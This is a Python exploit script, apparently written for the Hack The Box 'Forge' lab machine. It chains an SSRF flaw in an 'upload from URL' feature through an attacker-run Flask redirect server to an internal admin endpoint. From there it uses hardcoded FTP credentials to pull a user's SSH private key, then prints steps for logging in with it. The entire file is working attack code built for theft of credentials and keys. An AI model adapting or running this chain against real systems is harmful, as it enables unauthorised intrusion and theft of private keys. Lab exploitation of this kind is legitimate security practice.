#!/usr/bin/python3
# Creator: brutuspt

import urllib.parse
import requests
import argparse
import os, sys
import base64
from bs4 import BeautifulSoup

from flask import Flask, request, redirect
app = Flask(__name__)

parser = argparse.ArgumentParser(description='Process some integers.')
parser.add_argument("-t", "--target", help="Target Domain Name/IP", required=True)
parser.add_argument("-i", "--IP", help="Attacker IP (Where to catch the rev shell)", required=True)
parser.add_argument("-wp", "--webport", help="Attacker Web Server Port (Where to server the payloads)", required=True)


args = parser.parse_args()

s = requests.Session()


@app.route('/trigger')
def trigger_ssrf():
    # trigger the first stage SSRF, make the target web app connect back to us and then...handle the redirect
    #proxies = { "http" : "127.0.0.1:8080" }
    headers = { "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" }
    url = "http://%s/upload" % args.target
        
    print("[INFO] Attempting to exploit the SSRF vulnerability in the 'Upload from URl'...")
    data = { "url" : "http://"+str(args.IP)+":"+str(args.webport), "remote": "1" }
        
    r = s.post(url, data=data, headers=headers) # proxies=proxies
    if "File uploaded successfully to the following url" in r.text:
        print("[SUCCESS] SSRF successfully exploited!")
        print("[INFO] Trying to obtain the automatically generated URL...!")
        soup = BeautifulSoup(r.text, 'html.parser')
        internal_url = str(soup.find_all('a', href=True)[2]['href'])
        print("[SUCCESS] URL extracted: " + internal_url)

        # Make a request to the newly generated URL, after the first SSRF hop and the final destination: the FTP server only accessible internally
        r = s.get(internal_url, headers=headers)
        print("[INFO] Trying to obtain the private SSH key...")
        print(r.text)
        print("[SUCCESS] user's SSH private key obtained!")
        print("[INFO] Next steps:")
        print("[INFO] 1- Write the content into a file (e.g. id_rsa)")
        print("[INFO] 2- Give it the proper permissions: chmod 600 id_rsa")
        print("[INFO] 3- SSH into the target system: ssh -i id_rsa user@forge.htb")
        return r.text



    else:
        print("[ERROR] SSRF failed!")
        sys.exit(1)




@app.route('/')
def redirect_SSRF():
    # after inspecting the results on the /announcements endpoint, we notice that there is a more "relaxed" web app only accessible via localhost
    # we know the ftp creds and now, we need to communicate with it, let's just try to make a request in order to login to the internal FTP server through the new web app 
    redirect_url = "http://admin.%s/upload?u=ftp://user:heightofsecurity123!@127.0.0.1/.ssh/id_rsa" % args.target
    return redirect(redirect_url)


def main():
    if args.target == "forge.htb":
        print("[INFO] Starting our redirect server to bypass the SSRF filter, we are going to route the traffic through us and sent it back to the target subdomain admin.forge.htb...")
        app.run(host='0.0.0.0', port = args.webport, use_reloader=False)


    else:
        print("[ERROR] Please use the forge.htb domain as the target")
        sys.exit(0)


if __name__ == "__main__":
    main()
